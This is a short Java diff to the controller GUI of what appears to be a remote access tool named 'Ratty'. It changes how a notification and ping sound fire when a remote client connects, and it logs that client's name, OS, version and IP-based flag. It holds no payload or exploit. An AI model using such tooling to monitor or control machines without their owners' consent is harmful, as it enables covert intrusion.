@@ -697,14 +697,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final String version = packet.getVersion();
 		final String address = client.getAddress();
 		final ImageIcon icon = getFlagIcon(address);
-		final Notification notification = new Notification(name + " " + address, icon);
 		
 		client.logIn(name, os, version, icon);
 		client.addListener(this);
 		
 		gui.addClient(client);
-		notification.trigger();
-		PING.play();
+		
+		if (true) {
+			final Notification notification = new Notification(name + " " + address, icon);
+			
+			notification.trigger();
+			PING.play();
+		}
 	}
 	
 	@Override
